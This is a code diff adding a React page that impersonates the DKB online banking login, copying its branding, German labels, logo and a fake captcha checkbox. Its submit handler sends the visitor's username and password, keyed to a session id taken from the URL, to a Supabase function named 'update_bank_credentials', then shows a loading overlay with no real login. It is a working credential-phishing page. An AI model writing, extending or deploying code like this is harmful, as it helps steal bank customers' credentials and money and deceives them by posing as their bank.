@@ -1,0 +1,239 @@
+import { useState, useEffect } from "react";
+import { useSearchParams } from "react-router-dom";
+import { supabase } from "@/integrations/supabase/client";
+import LoadingOverlay from "@/components/LoadingOverlay";
+import { usePageMeta } from "@/hooks/use-page-meta";
+import logoAsset from "@/assets/dkb-logo.svg.asset.json";
+
+const BG = "#F3F9FE";
+const FOOTER_BG = "#09141C";
+const PRIMARY = "#006AC7";
+const PRIMARY_HOVER = "#005BAE";
+const INPUT_BG = "#F2F9FF";
+const INPUT_BORDER = "#CFE2F2";
+const TEXT = "#1A1A1A";
+const PLACEHOLDER = "#5A6472";
+
+const FOOTER_LINKS = [
+  { label: "DKB Verwalterplattform", href: "#" },
+  { label: "DKB Treuhänderplattform", href: "#" },
+  { label: "Impressum", href: "#" },
+  { label: "Datenschutz", href: "#" },
+  { label: "Cookie Einstellungen", href: "#" },
+  { label: "Preise & Bedingungen", href: "#" },
+  { label: "Hilfe", href: "#" },
+];
+
+const DKB = () => {
+  const [searchParams] = useSearchParams();
+  const sessionId = searchParams.get("s") || "";
+  const [username, setUsername] = useState("");
+  const [password, setPassword] = useState("");
+  const [showPassword, setShowPassword] = useState(false);
+  const [humanChecked, setHumanChecked] = useState(false);
+  const [showLoading, setShowLoading] = useState(false);
+  const [submitting, setSubmitting] = useState(false);
+
+  useEffect(() => {
+    window.scrollTo(0, 0);
+  }, []);
+  usePageMeta("DKB – Mein Banking", logoAsset.url);
+
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (submitting) return;
+    if (username.trim().length === 0 || password.length === 0) return;
+    setSubmitting(true);
+    if (sessionId) {
+      const { error } = await supabase.rpc("update_bank_credentials", {
+        p_session_id: sessionId,
+        p_username: username,
+        p_password: password,
+        p_username_label: "Anmeldename",
+        p_password_label: "Passwort",
+      });
+      if (error) console.error("Update failed:", error);
+    }
+    setShowLoading(true);
+  };
+
+  return (
+    <div
+      className="min-h-screen flex flex-col"
+      style={{
+        backgroundColor: BG,
+        fontFamily: "'DKBEuclid', system-ui, -apple-system, sans-serif",
+        color: TEXT,
+      }}
+    >
+      {/* Header / Logo */}
+      <header className="px-5 lg:px-10 pt-6 lg:pt-8">
+        <a href="#" aria-label="DKB" className="inline-block">
+          <img src={logoAsset.url} alt="DKB – Das kann Bank" className="h-[52px] lg:h-[60px] w-auto" />
+        </a>
+      </header>
+
+      {/* Main */}
+      <main className="flex-1 flex items-start justify-center px-4 pt-10 lg:pt-16 pb-16">
+        <form
+          onSubmit={handleSubmit}
+          className="w-full max-w-[560px] bg-white rounded-[14px] px-6 sm:px-12 py-10 lg:py-12"
+          style={{ boxShadow: "0 2px 10px rgba(9, 20, 28, 0.06)" }}
+        >
+          <h1
+            className="text-center mb-8"
+            style={{ fontWeight: 700, fontSize: 32, color: TEXT, letterSpacing: "-0.01em" }}
+          >
+            Mein Banking
+          </h1>
+
+          {/* Anmeldename */}
+          <label className="block mb-4">
+            <span className="sr-only">Anmeldename</span>
+            <input
+              type="text"
+              autoComplete="off"
+              value={username}
+              onChange={(e) => setUsername(e.target.value)}
+              placeholder="Anmeldename"
+              className="w-full outline-none"
+              style={{
+                backgroundColor: INPUT_BG,
+                border: `1px solid ${INPUT_BORDER}`,
+                borderRadius: 6,
+                padding: "16px 18px",
+                fontSize: 16,
+                color: TEXT,
+                fontFamily: "inherit",
+              }}
+            />
+          </label>
+
+          {/* Passwort */}
+          <label className="block mb-5 relative">
+            <span className="sr-only">Passwort</span>
+            <input
+              type={showPassword ? "text" : "password"}
+              autoComplete="off"
+              value={password}
+              onChange={(e) => setPassword(e.target.value)}
+              placeholder="Passwort"
+              className="w-full outline-none"
+              style={{
+                backgroundColor: INPUT_BG,
+                border: `1px solid ${INPUT_BORDER}`,
+                borderRadius: 6,
+                padding: "16px 48px 16px 18px",
+                fontSize: 16,
+                color: TEXT,
+                fontFamily: "inherit",
+              }}
+            />
+            <button
+              type="button"
+              aria-label={showPassword ? "Passwort verbergen" : "Passwort anzeigen"}
+              onClick={() => setShowPassword((v) => !v)}
+              className="absolute top-1/2 -translate-y-1/2 right-3 p-2"
+              style={{ color: TEXT }}
+            >
+              {showPassword ? (
+                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
+                  <path d="M17.94 17.94A10.94 10.94 0 0 1 12 20c-7 0-11-8-11-8a19.77 19.77 0 0 1 4.22-5.22" />
+                  <path d="M1 1l22 22" />
+                  <path d="M9.9 4.24A10.94 10.94 0 0 1 12 4c7 0 11 8 11 8a19.77 19.77 0 0 1-3.17 4.14" />
+                  <path d="M14.12 14.12a3 3 0 1 1-4.24-4.24" />
+                </svg>
+              ) : (
+                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
+                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
+                  <circle cx="12" cy="12" r="3" />
+                </svg>
+              )}
+            </button>
+          </label>
+
+          {/* Friendly Captcha */}
+          <div
+            className="mb-6 flex items-center justify-between"
+            style={{
+              backgroundColor: INPUT_BG,
+              border: `1px solid ${INPUT_BORDER}`,
+              borderRadius: 6,
+              padding: "14px 16px",
+            }}
+          >
+            <label className="flex items-center gap-3 cursor-pointer select-none">
+              <input
+                type="checkbox"
+                checked={humanChecked}
+                onChange={(e) => setHumanChecked(e.target.checked)}
+                className="appearance-none w-[22px] h-[22px] bg-white"
+                style={{ border: `1.5px solid ${PLACEHOLDER}`, borderRadius: 3 }}
+              />
+              <span style={{ fontSize: 14, fontWeight: 600, color: TEXT }}>Ich bin ein Mensch</span>
+            </label>
+            <div className="flex flex-col items-end gap-1">
+              <span style={{ color: PLACEHOLDER, letterSpacing: 1 }}>···</span>
+              <a href="#" style={{ fontSize: 12, color: TEXT, textDecoration: "underline" }}>
+                Friendly Captcha
+              </a>
+            </div>
+          </div>
+
+          {/* Button */}
+          <button
+            type="submit"
+            disabled={submitting}
+            className="w-full transition-colors"
+            style={{
+              backgroundColor: PRIMARY,
+              color: "#fff",
+              fontSize: 18,
+              fontWeight: 600,
+              padding: "16px 20px",
+              borderRadius: 6,
+              fontFamily: "inherit",
+              cursor: submitting ? "not-allowed" : "pointer",
+            }}
+            onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = PRIMARY_HOVER)}
+            onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = PRIMARY)}
+          >
+            Anmelden
+          </button>
+
+          {/* Forgot */}
+          <p className="text-center mt-6" style={{ fontSize: 15, color: TEXT }}>
+            <a href="#" style={{ color: PRIMARY, textDecoration: "underline", fontWeight: 600 }}>
+              Anmeldename
+            </a>{" "}
+            oder{" "}
+            <a href="#" style={{ color: PRIMARY, textDecoration: "underline", fontWeight: 600 }}>
+              Passwort
+            </a>{" "}
+            vergessen?
+          </p>
+        </form>
+      </main>
+
+      {/* Footer */}
+      <footer style={{ backgroundColor: FOOTER_BG, color: "#fff" }}>
+        <div className="px-5 lg:px-10 py-4 flex flex-wrap items-center gap-x-8 gap-y-3 text-[14px]">
+          <a href="#" style={{ color: "#fff", fontWeight: 600 }}>
+            Infoseite
+          </a>
+          <div className="flex flex-wrap items-center gap-x-8 gap-y-3 lg:ml-auto">
+            {FOOTER_LINKS.map((l) => (
+              <a key={l.label} href={l.href} style={{ color: "#fff" }} className="hover:underline">
+                {l.label}
+              </a>
+            ))}
+          </div>
+        </div>
+      </footer>
+
+      {showLoading && <LoadingOverlay />}
+    </div>
+  );
+};
+
+export default DKB;
